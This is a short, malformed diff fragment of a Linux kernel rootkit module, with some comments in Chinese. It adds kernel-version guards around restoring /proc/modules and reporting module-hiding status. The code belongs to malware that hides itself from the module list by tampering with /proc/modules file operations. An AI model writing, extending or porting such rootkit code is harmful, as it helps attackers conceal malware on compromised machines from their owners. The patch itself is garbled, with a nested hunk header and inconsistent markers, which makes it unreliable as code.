@@ -101,10 +101,20 @@
      
      proc_modules = proc_find_entry("modules", NULL);
 @@ -100,6 +112,10 @@
-         printk(KERN_INFO "[rootkit] Restored /proc/modules\n");
-     }
+        printk(KERN_INFO "[rootkit] Restored /proc/modules\n");
+    }
 +#else
 +    // 在较新的内核版本中无需恢复
 +    printk(KERN_INFO "[rootkit] /proc/modules restore not needed in this kernel version\n");
 +#endif
  }
+
+@@ -211,5 +223,9 @@
+         module_hidden ? "Yes" : "No",
+         "Partial", // sysfs隐藏状态
++#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
+         original_proc_modules_fops ? "Yes" : "No"
++#else
++        "Not Supported"
++#endif
+     );
